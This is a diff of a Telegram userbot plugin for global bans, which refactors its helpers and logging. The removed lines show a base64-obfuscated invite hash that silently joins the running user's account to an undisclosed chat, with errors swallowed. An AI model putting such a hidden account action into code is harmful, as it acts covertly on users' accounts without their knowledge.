@@ -2,44 +2,23 @@
 # Ported by @mrismanaziz
 # FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
 # t.me/SharingUserbot
-#
 
 import asyncio
-import base64
 from datetime import datetime
+from io import BytesIO
 
 from telethon.errors import BadRequestError
 from telethon.tl.functions.channels import EditBannedRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest
-from telethon.tl.types import Channel, ChatBannedRights, MessageEntityMentionName
+from telethon.tl.types import Channel
 
 import userbot.modules.sql_helper.gban_sql as gban_sql
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, DEVS
+from userbot import BOTLOG_CHATID
+from userbot import CMD_HANDLER as cmd
+from userbot import CMD_HELP, DEVS, WHITELIST, blacklistman
 from userbot.events import register
-from userbot.utils import edit_delete, edit_or_reply
+from userbot.utils import chataction, edit_or_reply, get_user_from_event, man_cmd
 
-BANNED_RIGHTS = ChatBannedRights(
-    until_date=None,
-    view_messages=True,
-    send_messages=True,
-    send_media=True,
-    send_stickers=True,
-    send_gifs=True,
-    send_games=True,
-    send_inline=True,
-    embed_links=True,
-)
-
-UNBAN_RIGHTS = ChatBannedRights(
-    until_date=None,
-    send_messages=None,
-    send_media=None,
-    send_stickers=None,
-    send_gifs=None,
-    send_games=None,
-    send_inline=None,
-    embed_links=None,
-)
+from .admin import BANNED_RIGHTS, UNBAN_RIGHTS
 
 
 async def admin_groups(grp):
@@ -59,53 +38,12 @@ def mentionuser(name, userid):
     return f"[{name}](tg://user?id={userid})"
 
 
-async def get_user_from_event(event, uevent=None, secondgroup=None):
-    if uevent is None:
-        uevent = event
-    if secondgroup:
-        args = event.pattern_match.group(2).split(" ", 1)
-    else:
-        args = event.pattern_match.group(1).split(" ", 1)
-    extra = None
-    if event.reply_to_msg_id:
-        previous_message = await event.get_reply_message()
-        if previous_message.from_id is None and not event.is_private:
-            await edit_delete(uevent, "`Nah itu admin anonim 🥺`")
-            return None, None
-        user_obj = await event.client.get_entity(previous_message.sender_id)
-        extra = event.pattern_match.group(1)
-    elif args:
-        user = args[0]
-        if len(args) == 2:
-            extra = args[1]
-        if user.isnumeric():
-            user = int(user)
-        if not user:
-            await edit_delete(
-                uevent, "**Gunakan username, user id, atau reply untuk gban**", 5
-            )
-            return None, None
-        if event.message.entities:
-            probable_user_mention_entity = event.message.entities[0]
-            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
-                user_id = probable_user_mention_entity.user_id
-                user_obj = await event.client.get_entity(user_id)
-                return user_obj, extra
-        try:
-            user_obj = await event.client.get_entity(user)
-        except (TypeError, ValueError):
-            await edit_delete(
-                uevent, "**Tidak dapat mengambil user untuk diproses lebih lanjut**", 5
-            )
-            return None, None
-    return user_obj, extra
-
-
-@register(outgoing=True, pattern=r"^\.gban(?: |$)(.*)")
+@man_cmd(pattern="gban(?: |$)(.*)")
+@register(pattern=r"^\.cgban(?: |$)(.*)", sudo=True)
 async def gban(event):
     if event.fwd_from:
         return
-    gbun = await edit_or_reply(event, "`Gbanning.......`")
+    gbun = await edit_or_reply(event, "`Gbanning...`")
     start = datetime.now()
     user, reason = await get_user_from_event(event, gbun)
     if not user:
@@ -116,11 +54,9 @@ async def gban(event):
     if user.id in DEVS:
         await gbun.edit("**Gagal GBAN karena dia adalah Pembuat saya 🗿**")
         return
-    try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        await event.client(ImportChatInviteRequest(hmm))
-    except BaseException:
-        pass
+    if user.id in WHITELIST:
+        await gbun.edit("**Gagal GBAN karena dia adalah admin @SharingUserbot 🗿**")
+        return
     if gban_sql.is_gbanned(user.id):
         await gbun.edit(
             f"**Si** [Jamet](tg://user?id={user.id}) **ini sudah ada di daftar gbanned**"
@@ -158,42 +94,13 @@ async def gban(event):
             f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Added to gbanlist.**"
         )
 
-    if BOTLOG and count != 0:
-        reply = await event.get_reply_message()
-        if reason:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                f"#GBAN\
-                \nGlobal Ban\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
-                \n**Reason :** `{reason}`\
-                \n__Banned in {count} groups__\
-                \n**Time taken : **`{timetaken} seconds`",
-            )
-        else:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                f"#GBAN\
-                \nGlobal Ban\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
-                \n__Banned in {count} groups__\
-                \n**Time taken : **`{timetaken} seconds`",
-            )
-        try:
-            if reply:
-                await reply.forward_to(BOTLOG_CHATID)
-                await reply.delete()
-        except BadRequestError:
-            pass
 
-
-@register(outgoing=True, pattern=r"^\.ungban(?: |$)(.*)")
+@man_cmd(pattern="ungban(?: |$)(.*)")
+@register(pattern=r"^\.cungban(?: |$)(.*)", sudo=True)
 async def ungban(event):
     if event.fwd_from:
         return
-    ungbun = await edit_or_reply(event, "`UnGbanning.....`")
+    ungbun = await edit_or_reply(event, "`UnGbanning...`")
     start = datetime.now()
     user, reason = await get_user_from_event(event, ungbun)
     if not user:
@@ -236,47 +143,55 @@ async def ungban(event):
             f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Removed from gbanlist**"
         )
 
-    if BOTLOG and count != 0:
-        if reason:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                f"#UNGBAN\
-                \nGlobal Unban\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
-                \n**Reason :** `{reason}`\
-                \n__Unbanned in {count} groups__\
-                \n**Time taken : **`{timetaken} seconds`",
-            )
-        else:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                f"#UNGBAN\
-                \nGlobal Unban\
-                \n**User : **[{user.first_name}](tg://user?id={user.id})\
-                \n**ID : **`{user.id}`\
-                \n__Unbanned in {count} groups__\
-                \n**Time taken : **`{timetaken} seconds`",
-            )
 
-
-@register(outgoing=True, pattern=r"^\.listgban$")
+@man_cmd(pattern="listgban$")
 async def gablist(event):
     if event.fwd_from:
         return
     gbanned_users = gban_sql.get_all_gbanned()
-    GBANNED_LIST = "**List Global Banned Saat Ini**\n"
+    GBANNED_LIST = "**List Global Banned Saat Ini**\n\n"
     if len(gbanned_users) > 0:
         for a_user in gbanned_users:
             if a_user.reason:
-                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) **Reason** `{a_user.reason}`\n"
+                GBANNED_LIST += f"❏ User ID: [{a_user.chat_id}](tg://user?id={a_user.chat_id})\n└ Reason: {a_user.reason}\n\n"
             else:
-                GBANNED_LIST += (
-                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) `No Reason`\n"
-                )
+                GBANNED_LIST += f"❏ User ID: [{a_user.chat_id}](tg://user?id={a_user.chat_id})\n└ No Reason\n\n"
     else:
         GBANNED_LIST = "Belum ada Pengguna yang Di-Gban"
-    await edit_or_reply(event, GBANNED_LIST)
+    if len(GBANNED_LIST) > 4096:
+        with BytesIO(str.encode(GBANNED_LIST)) as fileuser:
+            fileuser.name = "list-gban.text"
+            await event.client.send_file(
+                event.chat_id,
+                fileuser,
+                force_document=True,
+                thumb="userbot/resources/logo.jpg",
+                caption="**List Global Banned**",
+                reply_to=event.reply_to_msg_id,
+                allow_cache=False,
+            )
+            await event.delete()
+    else:
+        await edit_or_reply(event, GBANNED_LIST)
+
+
+@chataction()
+async def _(event):
+    if event.user_joined or event.added_by:
+        user = await event.get_user()
+        chat = await event.get_chat()
+        if gban_sql.is_gbanned(user.id) and blacklistman and chat.admin_rights:
+            try:
+                await event.client.edit_permissions(
+                    chat.id,
+                    user.id,
+                    view_messages=False,
+                )
+                await event.reply(
+                    f"**#GBanned_User** Joined.\n\n** • First Name:** [{user.first_name}](tg://user?id={user.id})\n • **Action:** `Banned`"
+                )
+            except BaseException:
+                pass
 
 
 # Ported by @mrismanaziz
@@ -286,12 +201,12 @@ async def gablist(event):
 
 CMD_HELP.update(
     {
-        "gban": "**Plugin : **`gban`\
-        \n\n  •  **Syntax :** `.gban` <username/id>\
+        "gban": f"**Plugin : **`gban`\
+        \n\n  •  **Syntax :** `{cmd}gban` <username/id>\
         \n  •  **Function : **Melakukan Banned Secara Global Ke Semua Grup Dimana anda Sebagai Admin.\
-        \n\n  •  **Syntax :** `.ungban` <username/id>\
+        \n\n  •  **Syntax :** `{cmd}ungban` <username/id>\
         \n  •  **Function : **Membatalkan Global Banned\
-        \n\n  •  **Syntax :** `.listgban`\
+        \n\n  •  **Syntax :** `{cmd}listgban`\
         \n  •  **Function : **Menampilkan List Global Banned\
     "
     }
